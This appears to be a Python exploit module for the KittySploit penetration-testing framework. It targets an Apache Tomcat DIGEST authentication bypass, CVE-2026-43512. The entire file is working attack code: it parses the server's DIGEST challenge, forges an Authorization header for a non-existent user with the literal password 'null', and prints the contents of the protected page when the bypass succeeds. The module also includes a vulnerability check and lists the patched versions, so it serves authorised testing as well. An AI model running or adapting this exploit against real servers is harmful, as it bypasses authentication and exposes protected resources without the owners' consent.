#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import hashlib
import re
import secrets
from typing import List, Optional, Tuple

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Auxiliary, Http_client):
    __info__ = {
        "name": "Apache Tomcat CVE-2026-43512 DIGEST authentication bypass",
        "description": (
            "CVE-2026-43512: when DIGEST authentication is enabled, RealmBase.getDigest() "
            "concatenates the literal string \"null\" for unknown usernames. A client digest "
            "computed with password=\"null\" matches the server hash. Note: standard "
            "UserDatabaseRealm may still reject unknown users in getPrincipal(); non-standard "
            "Realm implementations may be fully bypassable."
        ),
        "author": ["KittySploit Team"],
        "cve": ["CVE-2026-43512"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-43512",
            "https://github.com/apache/tomcat",
        ],
        "tags": [
            "tomcat",
            "apache",
            "digest",
            "auth-bypass",
            "cwe-592",
            "cve-2026-43512",
        ],
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation"],
            "expected_requests": 2,
            "reversible": False,
            "approval_required": True,
            "produces": ["exploit_paths", "risk_signals"],
            "cost": 1.0,
            "noise": 0.3,
            "value": 1.0,
            "requires": {
                "min_endpoints": 0,
                "min_params": 0,
                "tech_hints_any": ["tomcat", "java"],
                "tech_hints_all": [],
                "specializations_any": [],
                "risk_signals_any": [],
                "auth_session": False,
                "capabilities_any": [],
                "capabilities_all": [],
                "confidence_min": {},
                "confidence_min_any": {},
                "endpoint_pattern_any": [],
                "param_any": [],
                "api_surface_ready": False,
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "auth_bypass", "from_detail": "digest"},
                ],
                "consumes_capabilities": [],
                "option_bindings": {},
                "suggested_followups": [],
            },
        },
    }

    port = OptPort(8080, "Tomcat HTTP port", True)
    ssl = OptBool(False, "Use HTTPS", True, advanced=True)
    protected_path = OptString(
        "/protected/",
        "DIGEST-protected resource path",
        required=True,
    )
    username = OptString(
        "ghost",
        "Non-existent username to authenticate as",
        required=False,
    )
    digest_password = OptString(
        "null",
        "Literal password used in the client digest (CVE default: null)",
        required=False,
        advanced=True,
    )
    prefer_algorithm = OptChoice(
        "MD5",
        "Digest algorithm to prefer when multiple challenges are offered",
        required=False,
        choices=["MD5", "SHA-256"],
    )

    @staticmethod
    def _hash_hex(algorithm: str, value: str) -> str:
        algo = (algorithm or "MD5").upper()
        if algo == "SHA-256":
            return hashlib.sha256(value.encode()).hexdigest()
        return hashlib.md5(value.encode()).hexdigest()

    @staticmethod
    def _random_hex(byte_len: int = 8) -> str:
        return secrets.token_hex(byte_len)

    @staticmethod
    def _normalize_path(path: str) -> str:
        p = str(path or "/").strip() or "/"
        if not p.startswith("/"):
            p = "/" + p
        return p

    def _challenge_headers(self, response) -> List[str]:
        if not response or not getattr(response, "headers", None):
            return []
        headers = response.headers
        if hasattr(headers, "getlist"):
            values = headers.getlist("WWW-Authenticate") or headers.getlist("Www-Authenticate")
            if values:
                return [str(item) for item in values if item]
        single = headers.get("WWW-Authenticate") or headers.get("Www-Authenticate")
        if not single:
            return []
        if isinstance(single, (list, tuple)):
            return [str(item) for item in single if item]
        return [str(single)]

    def _parse_one_challenge(self, header: str) -> Optional[dict]:
        text = str(header or "").strip()
        if not text.lower().startswith("digest "):
            return None
        text = text[7:]
        challenge = {
            "realm": "",
            "nonce": "",
            "opaque": "",
            "qop": "",
            "algorithm": "MD5",
        }
        while text:
            text = text.lstrip(" ,\t")
            if not text:
                break
            eq = text.find("=")
            if eq < 0:
                break
            key = text[:eq].strip().lower()
            text = text[eq + 1 :].lstrip()
            if not text:
                break
            if text[0] == '"':
                end = text.find('"', 1)
                if end < 0:
                    break
                value = text[1:end]
                text = text[end + 1 :]
            else:
                end = len(text)
                for sep in (" ", ",", "\t"):
                    idx = text.find(sep)
                    if idx >= 0:
                        end = min(end, idx)
                value = text[:end]
                text = text[end:]
            if key == "realm":
                challenge["realm"] = value
            elif key == "nonce":
                challenge["nonce"] = value
            elif key == "opaque":
                challenge["opaque"] = value
            elif key == "qop":
                for part in value.split(","):
                    if part.strip() == "auth":
                        challenge["qop"] = "auth"
                        break
            elif key == "algorithm":
                challenge["algorithm"] = value or "MD5"
        if not challenge["realm"] or not challenge["nonce"]:
            return None
        return challenge

    def _parse_challenges(self, headers: List[str]) -> Optional[dict]:
        parsed = []
        for header in headers:
            item = self._parse_one_challenge(header)
            if item:
                parsed.append(item)
        if not parsed:
            return None
        prefer = str(self.prefer_algorithm or "MD5").upper()
        for item in parsed:
            if str(item.get("algorithm") or "MD5").upper() == prefer:
                return item
        for item in parsed:
            if str(item.get("algorithm") or "MD5").upper() == "MD5":
                return item
        return parsed[0]

    def _build_authorization(
        self,
        method: str,
        uri: str,
        username: str,
        password: str,
        challenge: dict,
    ) -> str:
        algorithm = str(challenge.get("algorithm") or "MD5")
        realm = challenge["realm"]
        nonce = challenge["nonce"]
        qop = challenge.get("qop") or ""
        opaque = challenge.get("opaque") or ""
        nc = "00000001"
        cnonce = self._random_hex(8)

        a1 = self._hash_hex(algorithm, f"{username}:{realm}:{password}")
        a2 = self._hash_hex(algorithm, f"{method}:{uri}")
        if qop == "auth":
            response = self._hash_hex(
                algorithm,
                f"{a1}:{nonce}:{nc}:{cnonce}:{qop}:{a2}",
            )
        else:
            response = self._hash_hex(algorithm, f"{a1}:{nonce}:{a2}")

        parts = [
            f'username="{username}"',
            f'realm="{realm}"',
            f'nonce="{nonce}"',
            f'uri="{uri}"',
            f'response="{response}"',
            f"algorithm={algorithm}",
        ]
        if qop:
            parts.extend([f"qop={qop}", f"nc={nc}", f'cnonce="{cnonce}"'])
        if opaque:
            parts.append(f'opaque="{opaque}"')
        return "Digest " + ", ".join(parts)

    def _request(self, method: str, path: str, headers: Optional[dict] = None):
        return self.http_request(
            method=method,
            path=path,
            headers=headers or {},
            allow_redirects=False,
            timeout=max(int(self.timeout or 10), 10),
        )

    def check(self):
        path = self._normalize_path(self.protected_path)
        username = str(self.username or "ghost").strip() or "ghost"
        password = str(self.digest_password if self.digest_password is not None else "null")

        initial = self._request("GET", path)
        if not initial or initial.status_code != 401:
            code = initial.status_code if initial else "no response"
            return {
                "vulnerable": False,
                "reason": f"Protected path did not return 401 DIGEST challenge (HTTP {code})",
                "confidence": "low",
            }

        challenges = self._challenge_headers(initial)
        if not any("digest" in item.lower() for item in challenges):
            return {
                "vulnerable": False,
                "reason": "HTTP 401 without WWW-Authenticate: Digest challenge",
                "confidence": "low",
            }

        challenge = self._parse_challenges(challenges)
        if not challenge:
            return {
                "vulnerable": False,
                "reason": "Unable to parse DIGEST challenge",
                "confidence": "low",
            }

        auth_header = self._build_authorization("GET", path, username, password, challenge)
        follow_up = self._request("GET", path, headers={"Authorization": auth_header})
        if follow_up and follow_up.status_code == 200:
            return {
                "vulnerable": True,
                "reason": (
                    f"CVE-2026-43512 digest bypass succeeded for user {username!r} "
                    f"on {path} (HTTP 200)"
                ),
                "confidence": "high",
            }

        code = follow_up.status_code if follow_up else "no response"
        return {
            "vulnerable": False,
            "reason": (
                f"DIGEST challenge accepted but bypass failed (HTTP {code}); "
                "Realm may reject unknown principals or target is patched"
            ),
            "confidence": "medium",
        }

    def run(self):
        path = self._normalize_path(self.protected_path)
        username = str(self.username or "ghost").strip() or "ghost"
        password = str(self.digest_password if self.digest_password is not None else "null")

        print_status(f"Probing DIGEST-protected path: {path}")
        initial = self._request("GET", path)
        if not initial:
            print_error("No response from target")
            return False
        if initial.status_code != 401:
            print_error(
                f"Expected HTTP 401 DIGEST challenge, got HTTP {initial.status_code}"
            )
            return False

        challenges = self._challenge_headers(initial)
        if not challenges:
            print_error("No WWW-Authenticate headers in 401 response")
            return False

        print_info(f"Received {len(challenges)} WWW-Authenticate header(s)")
        challenge = self._parse_challenges(challenges)
        if not challenge:
            print_error("Failed to parse DIGEST challenge")
            return False

        print_info(
            "Selected challenge: "
            f"realm={challenge['realm']!r} algorithm={challenge.get('algorithm')!r} "
            f"qop={challenge.get('qop')!r}"
        )

        auth_header = self._build_authorization("GET", path, username, password, challenge)
        print_status(f"Sending digest as {username!r} with password={password!r}")
        follow_up = self._request("GET", path, headers={"Authorization": auth_header})
        if not follow_up:
            print_error("Authenticated request failed")
            return False

        if follow_up.status_code == 200:
            body = (follow_up.text or "")[:2000]
            print_success(f"CVE-2026-43512 bypass succeeded — HTTP 200 on {path}")
            if body:
                print_info(body)
            return True

        if follow_up.status_code == 401:
            print_warning(
                "HTTP 401 after crafted digest — likely patched (>=9.0.118 / >=10.1.55 / >=11.0.22) "
                "or Realm rejected unknown principal"
            )
            return False

        print_error(f"Unexpected HTTP {follow_up.status_code}")
        snippet = (follow_up.text or "")[:500]
        if snippet:
            print_info(snippet)
        return False
